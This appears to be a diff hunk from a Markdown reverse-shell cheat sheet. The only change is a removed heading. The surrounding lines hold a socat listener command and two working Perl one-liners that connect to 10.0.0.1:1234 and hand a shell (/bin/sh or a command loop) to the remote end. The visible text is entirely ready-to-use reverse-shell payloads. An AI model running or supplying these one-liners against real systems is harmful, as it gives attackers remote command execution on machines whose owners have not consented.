@@ -44,7 +44,6 @@ socat file:`tty`, raw, echo=0 TCP-L:4242
 ```
 perl -e 'use Socket; $IP="10.0.0.1"; $PORT=1234; socket(S, PF_INET, SOCK_STREAM, getprotobyname("tcp")); if(connect(S, sockaddr_in($PORT, inet_aton($IP)))){open(STDIN, ">&S"); open(STDOUT, ">&S"); open(STDERR, ">&S"); exec("/bin/sh -i");};'
 ```
-### Listener
 ```
 perl -MIO -e '$PORT=fork; exit, if($PORT);$c=new IO::Socket::INET(PeerAddr, "10.0.0.1:1234"); STDIN->fdopen($c, r); $~->fdopen($c, w); system$_ while<>;'
 
